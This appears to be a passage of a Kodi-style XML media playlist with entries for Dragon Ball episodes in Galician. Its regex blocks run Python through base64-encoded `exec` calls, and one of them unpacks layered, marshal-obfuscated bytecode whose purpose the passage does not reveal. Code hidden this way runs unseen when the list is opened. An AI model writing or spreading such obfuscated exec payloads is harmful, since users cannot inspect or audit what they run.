XpOUFJHTjNUWHBOTWsxcVl6Qk5lbEY2VFhwTk1VNVVUVEphUkdNMFRtcG5NMDlFVlhsT2Fsa3lXa1JTYkUxNlNUSmFWRlY0VG5wQk0wNUVWWGxPZWxVeFRWUlNiRTR5UlRGTlJGa3pUa1JyTUZsNlVtdE9hbFV5VGxSUmVrNHlSVEZPVkdNeFRtcHJNVTlFVVRKT1JHY3hUbnBhYlU1VVFURk9SR013VGtkRk1VMTZXWGxPVkdNeFRrUlpNMDE2UlhsWmFrcHBUWHBGTTA5RVdYcE5lbFV4VDFSVk0wMXRXVE5PVkZKemZRNEFBSGxCZDFwdFFsRndNVnB0V20xYWJYQXlRVkZJTWt4dFNYVkJiVTR5UVZGSU5FRkhSREphZDFkMlFXMU1Na3gzVERCQlZFd3pXbmR3TTFwdFVqSk1SM0F5UVcxU00xcHRSWHBCVkVneldtMXdNa0Z0VGpOQlIwUnJRVkY0TWxwdFdqUkJkM2d5VEVkd05FRlJUREJhYlV3MFFWRjBNMEZSV210QlZFd3pRa2RNTlZwdFRqTkNSMXBxUVcxU01rRlJjRzFCYlhReldtMWFORnB0ZERGQ1IzQXdRVkZNTWsxM1dtdEJla3d5V25kSWJVRktVakZCYlhCclFWRjRNRUZ0UkROQlZGWXpRVkZYZGtGdFJERmFkM0F4UVhkU01VSlJSWGhhZWxadFFVZElORnA2Vm0xYVVYRjFRVWRFTTBGUlJYbEJiVXh0V2xGRU5FRkhUak5hVVhCcVdtMVdiVUZSY0RGQlVVeHRRVzFFYkZwdFVqQk5SMXBxV20xT01FRkhjREJCYlZJelFsRkpkVnB0VWpKTWQxb3pRVlJJTUVGUlNEQkJkMGd3VEcxd2EwRjZTREpCVVV3d1dtMXdNbHBIV2pWQmQwZ3pRWGRGZUVGM2REQkJSMFF3V20xSU1FRjNXakZCTWxKdFdtMXdNRUYzVmpOQlVYQnFRWGRFTVVKUmNESmFiVWh0V25kSU5WcHRUREZhVVhBeVFYcFdNa0YzY0RSYWVsWnRXbEZGZVVGdFVqRkJiVXd6UVhkSU0wRlJjR3RCVVhRelFWRmFORnA2VERCQlIwaHRRVkZNTWtGUmNERkJWRm93UVcxd05GcDZWak5CUjFvd1FVZFNNVUpIV210QmQwUXlXa2R3TTBGUmRHMUNSMHh0UVhkV01FMVJTREJCUjB3eVduZE1NRUZIZERCQ1VWcHNRWGRXTUVGUlYzWkJVVnB0V2tkYWJFRnRUREpDUjBneFFWUmFZVkZFWTJWTlMzbG5URXBuZVhCMlRqbFdVSEJyYjJ4bllVZFJSVEJGUjNGbmNFbEZlRnBIVTBsdk1rRmhRVEpOWWtaS1JVOXVWWEZ1UWtveGVYRjNkVUZOU2tsUFFsRlRORUY2T1ZGSWQzUXdRbE5TTVc5SlJESkhlakV4UmtkSmJVbFVOV1ZhVkZOSlJYcG5aRTFMWXpSS1MxTjZjbUZqWjI5M1RXdHhNbFl5Y1RBNVZYRXdjR1ZaTURWWmJuZEZSMFJIZUROSmQxTjRUREJCYVhCM1FYcHlkMFY1UkV0UFIwbDRkRzF3U25sS2IzcG1Na3hJZFU5eE1WWnRSbmRGUlc5UVoyeEZlbE5aY1ZGRVpVbElWMVJCYkdacVRFaGpaRUpVVTJ4d1NHSXdXRzFOYWt4SldqVkJZVVZNY0ZReE0wMVJWbXR2VVU5TFJVWm5TVWgzUVZGdVNGYzFUVzFGU0VZeVRERkpTbE5rY1VsMGJWa3dTVFp3VVVGTlFsSk5UVUYyT1VsSVNFbFBjVzFGWjI1NGNEUmFTMGxRYm0xRmFscDNjREp4VW1OM1JYcHFOVWxIV2pGYU0yTkdiM1puV2xsdFRHbEhVVTh3Y1d3NVpVWkxWMUZ2TWtGaVRUQmpTRUZJTVZwd2VIZ3lSRzFKZWxveU1VMUpTbmxhY2tsNWFVWjZTV052U0d0UWIwZ3dhMEpHWjBaSmJHWTFSVzFPTlUxaFkxRkJTRVZrY1VoVFZuQlRRV3hITVUxS2IyRjFURXA0ZVZORU1VaHFSVkZhYTI5aFNXNXVVblZyV0RCWFRVRkhjV2RNU1UxaWNsTlBUVnBLWTA5RVlVOU5XRzFYVkVwSGVUWnlZVll4U1ZWQlNVcFNRV2hFZUd0UVFWRjFNbTVJU1hsYVNGY3dUWHByTUZrelYyVkNTblYzY1hnd01XOUllV2RITW1kUVJtdzVWVzVTWjNwS2VHSnNXa2hqWm04eVZqRndlR3RqUmtwcldVWmhWbTFDVWpsQlJIbEZaRUpJTUd0SWQzRjJjREJyU1hCSGVYZHlVVVZDY1VoaldrRlVZMFZHZDFkbVJIcEpiSEV6VjNseVNrRjZUV3htTVVWS1kzcHZNMXBzUmtsUE1VVkxlR1ZOTVhsNmNtRkZRVWRTTVhsSFNHZDNiekJuVEVwS2RHeEVNSEV6VFZGd2FrMUhSWGx1TW5sTVFVbEJTbTlMZVZCR1lVMVljbE5UU1VZelRWTmFTSGh0U1RCRmVVeEtNVzF2YlVWWVNrcDVNa2hLTUd0RVNubGhiMHQwTTFwVU9HMXlZWFZsY0ZGRlJFa3hkVU52VVU5cFJtMUpRVUY2VEd4Q1VVRkhTa3RQWTBkNFowdHVVbWQ2U0ZGVFFXOUdPVE53VlZkclJFbFhaMFpIVFVGSU0yTXpiMGhKVVVKS1ltbEVZVWswV0cxMVdFRXdXbXh2VUdjd2IwdFRibkV6ZVRad1ZFRlhia2gxTlVKU1JXWmFNVk5JUjFKblUwZEpRVXRaYlZOS1FrZE5hazFTUldWSlZVMVVXVE5XTUVKVWVHMUJVVWx0YnpKbU0zQlNTVVJhUjNWbVdrbzVaVzk2UkRSSGVsbzBjREp4WjBaaFltVktWRFZoU1VobVpYQlNhMlJ3U21OblJuZDFkMGN5ZFdOdlVrVXhSSHAxTUhKNGFteElWR3RhVFVabVpVZEhUMU5HTUdkbVJFaG5hRTE1VTJORVNtZHNjVWRGUW00eWVUUnVlbE5oVERJeFNXNWhZMlJLU25GaWJuZEpla3d5WWpKeGQwMUZja2RKWlVKVU9WZHZVWEV6U1hwalNXOXRSVkZDU0ZjemNsQm5WMGxLUVROeVIwNHdRa2ROVkVKUlUzcGFlRGxJY0ROQlZVUklkVmROVVZOSGNWUk5aVzVUZVd0Rk1qZ3hUREJ4UWtSdFFVWlpNVk5EUVVsaWFraFZRVmxFZW1vMWNESjFkMHA0WjFOTlNsTjVTWGw1WkhGSWNEQkZTR05DV25oamVuQjRNVkZNYlUxaVNYaG1hVzlLV2pSSlNYVnFTVlZYUWtGSWNXNXdiWGhyUjFRd05FcEhXbTFDVW10a1FUSXdOVUV5TlRKSU1IbFBia2hGZUVkTFRqSnZTRFZOV20xVFpFRkxUMWxHZVVsdVdrbDVaazFLUlhsQmVVbEJiekJuYTI5M1FUTmFlRUZQU0d3NVNFMTRWMVZDU0VFemNFdDFiRVZKVW1Wd1UzbDFTRE5PYkV4NGEwbHZNM0ZhY0ZSeE5HOTRabVZHZDBsaVIwcEJkMjh3WmpGYVNubExUVWxXYkVreVNXZHZWWFZoYmpKSlFXNHpjVUp2TTFOYVRFZFdNbkZTWXpORlNsTmhSVlJKWVVGVWRXTnhNRm96V0RKeFVtNVJWbWxhVTA5NVNUSjFObkpLVFhaTWJVOVhRWGhTYTNKTFR6QkZNRUZIY0hsaU5VMUhUVFZFUzFOTFdHMTVSa0pRWjFOSVZWTmhjSGhtWlc1M1NXZHhNVWxuU0dGamRVRmhkVTl2ZUZJeVFrZFhNRVF6U1dOd1lVVjNia3RXTVVKSFYwOUNVMkl5VEhkNE1rWnRRV1p2ZVVsbFNWRkVaVTFSZUROeVlVZzFXVzEwYVVGSlYySllNRk14Y0ROQlowUXhkV2xCUmpsTWNFbGlNazFLWmpKQ1NHdHRXa3B4UjBKSWNYaFpNM2d3YjBZNVkzSktPV0pOZWsxRldESjVSa3A2WTB4WmJVRkVibEY1Ykc1SU1UTklSMFZSV2xKcmVWcHRRVkphVW10bmJtMUJNMWd6ZFVaTVIzRmljR0ZhYVVSNVNEUkNSbVpzU1ZKbk1VRkhUMFJ5VkhGSVJWSmFiVVpLVFdoS1IxZDNSMGx4TVV4Mk9XbE5WWFExV0RGVGRWZ3hSVzVaTWtWWVJWVk9hWEZWVDBGWmJYRXhURVk1UmtwNmVVcENTMUpwUVRGMVNVbFVNR2xLVkZKdGNWQm1NMjlIV21sS1VWZEVjWGR4UTBSc1oycHZiRGxtUmxSRmJGbHNabTFIVVVsNFdXMUZiSEF4U1dORWVIa3pUVEk1TmtRd1UyWmFiVWcxUmpCclZXNUpTV2xDU2tWWlFraFhWbkI2UlU5d2VFMU5SVkphTkV3emRHbEtVVkkwYmxGUGJVRXpRWGxKUm1kQldHeG1iVVF5WmpCR1NqRktRa3RCUTAwd2RWUk1lamxsVERKaU1VeExZM2RaTVVocFdsVk9NMXA2Y1hsYVlVVnFjbnAxWTI0eVdqSndZVUZJVFV0UFFVMTRZMmx1TTFKcFdUQk1NRVV3Y0cxYVNrbExUVkY1WW05S2NHdEpTazFJUjJGd01saHRVbTFDVTBSdFRURmphbTh4U0ROdmJEZ3lRVk5OUmtoS1FVRlpiWFZvU1hwRllVcDNjV1ZOYlUxNFRHeG1OVWxWVFdsdVIxWXpSSGRKVmtGVWRXSnhNVll3UjFGMVoxZ3laMmRZTUVScmIyRkJWVUpJZFVwSFJqbHBjRE5JTTBKU01XTnVkM2x1YnpKVGVVUXpRVU55U0VGSmIwZDFWVzUzU1ZsSVNWb3lSSGxCTTNCR09EQnZTa0V6YjFGNWJYSlJjVU5hU1hnMVRVWm5VVTE2T1cxeFNqaGxUREphYVVGSFZteEhNbGRaV1d3NVprRktOR2xaTWxOSVFWQm5kM0ZzT1U5SlNuRlJUSGhuVmxwUmNHbEVNblJ0Y0cxSWEzRXpRVWxOTVUxMlNsSklNVzR5ZEdsdVlWZE1UREo1YkVjeVYwZEpTR3RRV1ROU01Wa3pjV2xCVVhReGJqSjVVRmt4U0dsYVZGb3hSMGhhWlhCNGRWTkhiVlpwV0d3NVZFUXpWbXBaYlZOVlFYWm5hMHBoUkdWTlIzZzBTbnBtTTBWMk9WaENTRXhwYmtwRlRYSlVSVU5IZUVWRlFXRlRSVnB0ZUdWWk1WbzBSSFk0TTBoc09UWk5SMDlzUVhoYU5WcFFaMUZFU0ZwbFJWRk5iVXA2U1dWQ1JqbHFUVE5hYVc1S09HdEViVnBsVEVZNGEwa3lhbWxLVUdkamNHdzVZVUY1UlVKQlUwRmpia2RPYlhKTFJXZHZNMGxTUTBjd1lWRkVZelp1U2psb1ZsRXdkRmN4YXpSQmJWZHdjbEZOZWt0VmRETkJVMnMwV20xVGNISlJXbTFYYWpCWWIzcEphVlpSTUhSTlMwMTFiMUIwWVV0VmRESmFlV3MwUVhkNWNISlJUWGxMVlhReVdrbHJORUZ0UVhCeVVVeHRTMVYwTWtKSmF6UkJkM2x3Y2xGWGVVdFZkRE5CU1dzMFFYcEpjSEpSVERSTFZYUXlRVWxyTkVGdGRYQnlVVTEzUzFWME1rSkphelJCZDAxd2NsRndOVXRWZEd4Q1UyczBRWHBGY0hKUlRYcExWWFF6V25sck5FRnRUM0J5VVV3MFMxVjBNa0ZKYXpSQmJVbHdjbEZ3YlV0VmRHeENTV3MwV25kT1lWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReldqRnJORnA2U1hCeVVVd3dTMVYwTWtGSmF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVmpSTFZYUXpRVk5yTkVGdFYzQnlVVXcxUzFWME1rMUphelJCZDNsd2NsRndNRXRWZEROQ1NXczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNWM0J5VVV3MVMxVjBNazFKYXpSQmQxTndjbEZ3YlV0VmRESmFNV3MwUVhkNWNISlJURFZMVlhSc1RVbHJORUZ0U1hCeVVVMTVTMVYwTWtKVGF6UkJkMGx3Y2xGd05FdFZkREpNTVdzMFFYZDVjSEpSVERKTFZYUXpRa2xyTkZwM2RYQnlVVTE2UzFWME0xcDVhelJCZDFOd2NsRk1iVXRWZERKTU1XczBRWGRKY0hKUlZqVlhiSGgwV0d4UGVYRjZVMlpZVUhGd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFF5V2pGck5FRnRRWEJ5VVZkNVMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhSc1FsTnJORUY2VjNCeVVVd3hTMVYwTTBKSmF6UkJla1Z3Y2xGTWEwdFZkREpNZVdzMFFYZEpjSEpSY0d4TFZYUnNXbE5yTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoRU1GaE5TMDExYjFCMWQyOHlNV3B1U210NVdGVmpabTVLVm1oTlZFbDNiekl4YW5CNlNXMXdiSFYyVEV0QmVVRjNSR2hNZDB3d1RWUkpkMjh5UlhsWVZFa3lURXBxWWxjeGF6UkJla2x3Y2xGTU1VdFZkREpOZG5CaldFWjRabGR0YTIxeFZWZGpiM3B3SzFkc2FtRk5TM1Y1VEd4d1kxaEVQVDEwQlFBQUFISnZkREV6Y3drQUFBQnRiM0p3YUdWMWN5QnpIQUFBQUdOdlpHVmpjeTVrWldOdlpHVW9kSEpwYm1sMGVTd2dlbWx2YmlsMEJnQUFBRzl5WVdOc1pYTWVBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaHJaWGx0WVd0bGNpQXNJSHBwYjI0cGRBTUFBQUJ1Wlc5ekNBQUFBRHh6ZEhKcGJtYytkQVFBQUFCbGVHVmpLQXNBQUFCMEJnQUFBR0poYzJVMk5IUUdBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/cX9cfwc.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
-->
-----------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Dragon Ball [COLOR orange] Galego[/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGZRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SRmsxVGxSak1rNXFXbXROYlVrelRVUktiVTE2UVRCYVZGSm9UWHBuZWsxVVVYaE9Na1V5V2tSak1FNUVZekJaYWxrMVRYcG5NbHBFWTNkT2JVMHdUMFJXYUU1VVl6Qk5lbGswVG1wUk1FMXFVWGhPUkUweVRXcGplazE2VlRCT2VsVTFUbXBKZWsxVVVYcE5lbWQ2VFdwTk1rNVVaekZOVkZsNFRtMUZNRTFVVFhoT2VsVXlXV3BOZUU1NlozbFpha3B0VGxSbmVrNUVXbXhPYlZVd1RtcFZNVTR5UlhwTlJFMTRUbnBGTTA1RVRUVk9iVkV3VG1wVk1rNTZUVEpaYWxrMVRrUnJlazFxVFROT2JVMTZUMFJaZWs1cVRYcE9lazB4VGxSUk0wNXFXVEZPYWxrelRtcFpORTU2WXpOT1ZHTTBUbXBaTVU5RVRYaE5lbWN4VFVSamQwNXRUVEZOUkVwdFRYcGplazVxWXpWTmVsVjVXV3BLYVU1SFdUQlBWRnBzVFhwUmVrOVVWbWhPYWxFeVRtcFpNazR5UlRKYVZGVXlUakpGTWs1cVZUSk5la2w1V21wTk0wNUhUVEpPYWtwdFRsUm5lazVVVFRCT2JWRXpUbXBOZWs1NlVUQk5lazAwVFhwQk1scHFXVEpPZWxsNVdtcE5lRTV0VFhsYWFtTjNUWHBaTWsxVVRUVk5lbEV4VFVSTmVrNXFWWHBQVkZreVRXMVpNMDVxVVRST2JVMHpUVlJrYUU1cVdUQmFhbVJvVFcxWk0wNUVUVEpOYlVreFdWUlJNMDVIVFRKT1JGa3hUbFJWTUZsVVRYcE5lbU13V1hwUk1FNXFSWGxaYWxwc1RucG5NVTFFVVRWTmVrVjZUbXBaZVU1VVl6Qk9lbEUwVGxSUk1rMXFWWGRPYWxreldWUmFhRTF0U1RCWmFsVjZUWHBOTWxsVVVtdE9ha1V5V2tSWk1rNUhTVEpaYWsxM1RucGpNRmw2WXpKT2VrMTVXV3BaTWsxNmF6Tk9WRkpvVFhwbk0wNTZZM2xPVkVFeVRYcFJNMDE2YXpCT1ZFMHhUa2RSZVZscVZUUk9lbGt4VG5wU2JFNXFXVE5OZWxKclRsZEZlazVFVm1oTmVsVXpUbnBXYUU1NlNYcE9lbHBzVG5wWk1VNUVUVE5OZWsweVRrUlpOVTU2U1RGTmFsbDZUbTFGTWs1VVNtMU9ha1Y1V1dwUk1rMTZaekZQVkdNMVRtcHJNazVFVFRKT1ZHY3hUbFJOZVU1VVZUTk9WRTB6VGxSSk1VMTZTbTFPTWtVd1RtcGpNMDV0VVRKTlZGVjZUWHBuTTA5RVVtMU9lbXN6VGtSVk1FNXFSWHBPVkZwcVRrUnJNVTlVVFhoT2JWVXlXa1JOTTAxNll6QlplbEp0VG1wUk1FNUVXbXhOZWxVelRVUk5lVTVVWnpCTmVtTjNUWHBWTVU1NlVteE5lbXN6VDFSYWJFNUVXVE5PVkZwcVRrUkpNazVxVFhoT2FtZDZUbXBLYVU1RVdUTlBWRlYzVFcxSk1GcFVXbXBPYWxFd1dWUlpOVTVIU1RKT2FsVXhUa2RSTTFsVVpHaE9iVTE2VGxSU2FFNXRTVE5QVkZKcFRsUmpNVTlVVFhkT2Vsa3lXV3BhYlU1SFNUSk9hbFY2VG0xTk1FMTZVbXBPVjBVelRsUmpOVTVxVFRGT2FscHFUakpGTUZsNldYbE9hbGt5V1hwak1VNUhSVE5aVkZwdFRtMVZNRTVxVVhsT2Fra3dXVlJhYkU1VVNYbFphbEp0VG1wck0xbFVZekJPYlZsNlRucFplRTE2UVROT2VrMTVUa1JWTTAxRVkzZE9SRTB3VG1wU2FrNHlSVEJaZWxKclRrZE5NVTVFVlhwT2Fra3hUWHBWTkU1SFJURlBWRkV5VFhwck0wMTZWVE5OZWswd1dtcGFiVTVIVVRKTmVsRjVUbXBaTVU5VVRUVk9iVkV5V1hwYWFVNVVUVEZPYWxVeFRucFpNRTFxVW10T1ZGRjZUMFJqTWs1dFRUTlBWRlV4VFhwTk1GcEVXVEJOZW1zeFQxUlplVTU2U1RKUFZHTTBUbnBOTTAxNlVtMU9WMFV5V2xSU2FrNXFZekphUkZKb1RYcEpNbHBVV1RWT2VrRjZUbXBLYlU1NlRUQk9hbEp0VFhwbk0wMUVUVE5PVkZFd1RsUmplazV0VFRGT1JHUm9UbFJKTWsxVVZUQk9iVlV3V1ZSU2EwNVVUWHBQUkZwcVRucFpNazlFVFRST2FtY3hUa1JrYUU1NlJUTk5SRTB6VFhwRk1GcHFXVFJPUjAweFRsUlZNVTE2V1ROUFZGbDVUa2RKTWs1Nll6Qk9hbGt5VDFSVk5FNUVVVEpOZW1ONlRsUk5lazlFV1RWT2FrVXhUMVJWTWsxNlNUSk9WRlUxVG0xRmVWcHFUWGhPZWxFeFRVUmFhVTV0U1hwT2VtTTBUa2RWTWs1NlZYbE9lbGw2VG5wVmVVNXFXWHBOVkZrMVRtMVZNbGxxV21sT1JGRXpUV3BSTTA1NlVUSk5hbVJvVGtkUk1rMVVTbWxPZW1NeldWUlNhazVxVFROT1JGSnJUa1JyZVZwcVdtdE9Na1V3VGxSYWJFNVVhek5OVkZWM1RtcEZNMDlVVVhsT1JHY3lXa1JqZDA1NlVUQmFSRmw2VG0xVk1rMVVVbXROZW1Nd1dWUlJNVTU2YXpGT1JGSnNUa1JKTWsxcVRYbE9lbEV6VFVSVk1rNTZhekZOZWxVMFRrUkZNVTVFWXpGT1IxVXhUbnBaZVU1dFRYbFphbGswVFhwTmVrMUVXbXROZWtrd1QwUkthVTE2U1RCWmVsRXlUbFJCTWxwcVVURk5la0V3V1dwU2JVNUVSVE5PVkZKc1RsUnJNVTFFVFRCT1ZHTXhUa1JOZVU1NlJUQmFWRkpyVG0xRk1VNUVZelZPUjBVeFRYcGplRTVVV1RGUFJGRTFUbXByTWs1VVdYcE9iVmw2VFdwU2JFMXRXWHBPZWxGNFRYcEJNazFxWTNoT2Fsa3lUbFJWZUUxNll6Qk9hbEUxVG5wVk1rMVVUWHBPZWtVeVdrUmplazVFUlhwTmVsWm9Ua1JaTWs1cVl6Sk9WR2N5V2xSamQwNXFTVEZOYWxWM1RucEZNVTlFVlRGTmVtY3lUMVJWTUU1RVZYbGFhbU15VGtSUk1FNXFVVEpPUjBWNlRXcFpORTVIVFhwUFZFMHdUakpGTWxwVVVYaE5lbWQ2VGxSUk1VNTZVVEJQVkUwelRrUnJNMWxVWXpKTmVrRjZUMFJSZUU1NlZUTk9SRkUxVGpKRmVrMTZZM2RPYWxrd1drUmpORTV0VFRGTmFscHJUWHBWTUU1RVRYcE9lbXN4VFhwUk1rMTZUWHBOYWxwcVRtcFpNMDE2V1RWT2Vsa3dXbXBqZUU0eVJUSmFWRnBwVGpKRk0wMTZUVFZPUjAweVRucE5NVTU2VFROTmFsSnRUWHBqTUZwcVVYaE9SR2Q2VFZSTmQwNVVUVEpPYWxrMFRrUnJNRTU2V1RGTmVra3dUV3BLYlUxdFdUQlBWRTE0VFhwTmVrMXFVbWhPYWxrd1RXcFpNazF0U1RGTmVrMTZUbFJaTUZsVVZYZE9SMGt5VG1wTk5VNVVaM3BOUkUwMFRrUlJlazE2VlRCT2JWa3dXbFJTYkU1NlRUQlphbFV3VG5wbk0wNUVVbTFPYWxVeFQwUlJlRTVFWjNwTmVsRjRUa1JOTVU5RVVYcE9iVWw2VDFSVmVrMTZhekphUkZVd1RsUm5lazVxVVRKT1ZFRXdUa1JWTWs1dFZUQlBWRnBxVG5wak0wMVVWWGRPZWsweVRucFZlVTU2VlhwT2VsSnRUa2RaZWsxRVZYcE9iVlV3V1hwVk5VNTZVWHBPUkZKcFRXMVpNMDE2VFhkT2JWVXlUMFJqZDA1RVJURk5WRXBwVG0xTk1GbDZaR2hPUkVVelRVUlNhRTE2UlRCTmVsSnFUbnBOTUZsNll6Sk9iVWt5VFhwTk1FNHlSVEZOZWxVMFRYcFpNVmxVWTNsT1IxVjZUMVJqZDA1RVp6Rk5SRTB3VG0xRk1VMUVUVFJPUjFrelRtcFpORTVxV1RCWmFsa3lUbnBCTUUxNldUSk9WR013V1dwUk1rNTZhekZPVkZWNVRXMUpNbGxVVFRWTmJVa3pUV3BOTWs1NlRUQmFSRXBwVG5wak1VMUVZekpPYWxVelRtcFZNVTVxWXpCYVZHTTFUa1JWTVUxcVNtbE9SRVY2VFZSU2JFNUhSVEpPVkZFeFRucFpNMDlVV21wTmVsa3hUbXBOZUU1cWF6RlpWRmw0VGtkRk0xbFVVVEJOYlZrelRXcFJlVTVFVVRGTmVsa3lUWHBSTWs5RVdUSk5lbFV3VG5wS2JVNXFZekZQVkZreFRrZEZNVTFVWXpWT2FrVXdXa1JTYUUxdFNURk5WRmt5VG0xVk1FMTZUVFZPUkUwelRucFpOVTVVWnpGWlZGbDZUbXByTUZsNldUSk9WR3N5V21wTk1rMTZTVEZPVkZwc1RYcFJNMDFxV1ROT1JFMHpUbXBaZWs1SFdYcE5WR013VG1wck1scFVWWGRPUkUwd1dXcFpNVTE2VlRGTlZGVjRUa2RWTWxsVVVtcE9WR3N3VFhwS2JVNVVhekphUkdONVRrZEpNbHBFVFROT2JVMTZUbXBqZVU1NldUSk5lbGt6VG0xWk1GcFVZM2RPVkZWNVdtcFNhRTE2V1RKTmFtTTFUa1JuZWs1NlRUUk9lbFV5VDFSamQwMTZUVE5PVkZVelRtMUpNazVxVFRST1ZGRXpUV3BqTVUxNldUTk9SRlV6VG0xSk1rMTZZelZPYlVrelRsUk5OVTU2WnpCT1JFMHhUbFJyTUZscVZYbE5iVmt3VFdwTk1VNVVZekZPVkZFeFRucFplVmxxVW1wTmVtc3dXbXBOTWs1VVozcE9WRkY2VGtSSmVrOUVVbWhPUjFVd1RWUlZNazV0VFRCT1JFMHpUa1JOZWs5RVl6Qk5lbU13VG5wak1FNXRTVEZPVkUxM1RrUlpNMDlVVFhkTmJWbDZUV3BhYVUxdFNUTk9lbEV5VFhwck0wOVVXVEZOZWxGNlRrUlNiVTU2YXpKYVZGVXhUbXBaTUZsVVdteE5lbEV3V2xSVk5FNUVUVEJaZWswMFRucHJNVTlFWXpCTmVtZDZUbnBSZUUxNlRYcE9hbFpvVGxSTk1VMVVTbTFPZWtVeFRWUk5lazE2VVRGUFZGa3hUbFJSTVUxRVl6Vk9lbGt3V2tSYWJVMTZUVEpQUkZGNVRYcG5lVmxxVVRKT1ZHZDVXV3BaTTAxNlVUSk5lbEpwVG1wWk0wOUVXbXBPUjBVd1dtcE5OVTVFUlhsYWFtTjZUbTFKTTAxRVdUSk9hbU13VFZSTmVrMTZRVEJOYWxreVRtcFpNRmxVV1RKT1JFMHhUbXBWTlU1VVNYbGFhbFUxVG1wTmVrMUVVbXBPYWsweVdtcFpNazU2VVRCT2VsSnNUbnBGTTA1RVVUQk5iVWt3V2tSVk0wNTZXVE5OZWxVd1RXMVpNRTVxVVhwT2FsVXlUMVJXYUU1RVZUTk5lazB3VG5wTk1GcHFWVEJPUkdjeFQxUlJlRTVVUVRKUFJGVjRUWHByTTA5RVRUTk9hbGt5VFZSTk0wNTZSWGxhYWsweFRrUk5NazVxWXpWT1JHTjVXV3BSTlU1RVRYcE9lbEpvVG5wRk1VNUVWWGROZWtsNlRXcFZkMDF0V1RCT1ZGVjVUbnBuTUU1RVZYZE9SRlV5V1dwUk5FNUVTVEZPUkVwcFRsUk5NazlFV20xT2JWVXlUbXBqTkU1cVZYcE9hazE1VG5wSk1rNXFVbXRPVjBVeVQwUlZlVTF0V1RKT2VsSnFUa1JqTVUxcVdYcE9SR3N4VDFSTk0wNUhWWHBQUkZKcVRucFplazFFVW1oT2Vsa3pUWHBWTTA1VVRUQk9hbEp0VFhwUk1FNUVUVEJPYWtreFQwUlNiRTE2UVROTlJHTTFUa1JGTWs1cVNtMU9SRVV5VG1wWk1FNXRUVEZOYWxVMFRsUnJNRTE2VVRCT2Ftc3hUWHBaTUU1NlJYbFphbEUxVGtSUk0wNXFZM2ROZW1zeVdtcFpNazVVVlhwT2VtTTBUa2ROTUU1cVVUUk9lbWN3VFZSWk1rNUVZekZOVkUwd1RtcGplazU2WXpOT1JGRXpUVl